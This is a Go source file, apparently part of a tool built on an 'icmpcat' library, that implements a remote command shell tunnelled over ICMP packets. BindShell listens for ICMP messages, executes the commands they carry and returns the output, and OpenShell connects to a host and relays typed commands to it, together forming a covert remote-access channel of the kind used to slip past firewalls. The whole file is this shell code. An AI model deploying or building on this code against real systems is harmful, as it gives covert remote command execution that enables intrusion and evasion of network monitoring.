package main

import (
	"bytes"
	"fmt"
	"io"
	"io/ioutil"
	"log"

	"github.com/APTy/gibs/icmpcat"
)

type CLI struct {
	icmp  icmpcat.ICMPCat
	input Input
	sema  chan bool
}

func NewCLI() (*CLI, error) {
	icmp, err := icmpcat.NewV2()
	if err != nil {
		return nil, err
	}
	return &CLI{
		icmp:  icmp,
		input: Input{},
		sema:  make(chan bool, 1),
	}, nil
}

func (cli *CLI) BindShell() {
	cli.icmp.Accept()
	cli.icmp.OnReceive(func(r io.Reader) {
		res, err := ioutil.ReadAll(r)
		if err != nil {
			log.Printf("err: %v", err)
			return
		}
		msg := parseMsg(res)
		if msg.kind != msgCmdType {
			return
		}
		fmt.Println(msg.value)
		cmd := runCmd(msg.value)
		response := newMsgResType(cmd)
		cli.icmp.Send(bytes.NewBuffer(response.bytes))
	})
	cli.icmp.Listen()
}

func (cli *CLI) OpenShell(host string) {
	cli.icmp.Connect(host)
	cli.icmp.OnReceive(func(r io.Reader) {
		res, err := ioutil.ReadAll(r)
		if err != nil {
			log.Printf("err: %v", err)
			return
		}
		msg := parseMsg(res)
		if msg.kind != msgResType {
			return
		}
		fmt.Printf("%s", msg.value)
		cli.sema <- true
		log.Printf("done receiving")
	})
	cli.input.On(func(b []byte) {
		cmd := newMsgCmdType(string(b))
		cli.icmp.Send(bytes.NewBuffer(cmd.bytes))
		<-cli.sema
		log.Printf("done inputting")
	})
	cli.icmp.Listen()

}
